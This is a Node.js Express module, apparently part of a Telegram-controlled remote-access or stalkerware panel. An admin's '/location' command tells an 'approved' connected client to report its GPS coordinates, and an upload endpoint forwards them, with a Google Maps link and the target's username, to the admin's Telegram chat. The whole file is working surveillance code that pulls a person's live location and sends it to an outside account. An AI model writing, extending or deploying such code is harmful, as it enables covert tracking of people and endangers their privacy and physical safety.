module.exports = function(app) {
    app.post('/upload-location', (req, res) => {
        const { lat, lon } = req.body;
        if (lat && lon) {
            const mapsUrl = `https://maps.google.com/?q=${lat},${lon}`;
            global.bot.sendLocation(global.adminId, lat, lon);
            global.bot.sendMessage(global.adminId, `📍 **Live GPS Location (${global.pendingUsername}):**\n[Open in Google Maps](${mapsUrl})`, { parse_mode: 'Markdown' });
            res.status(200).send({ success: true });
        } else {
            res.status(400).send({ success: false });
        }
    });

    global.bot.onText(/\/location/, (msg) => {
        const chatId = msg.chat.id;
        if (chatId.toString() === global.adminId.toString()) {
            if (global.approvedSocketId) {
                global.bot.sendMessage(chatId, "🛰️ Fetching GPS Location...");
                global.io.to(global.approvedSocketId).emit('get_location');
            } else {
                global.bot.sendMessage(chatId, "❌ **Access Denied!** Type /approve first.");
            }
        }
    });
};
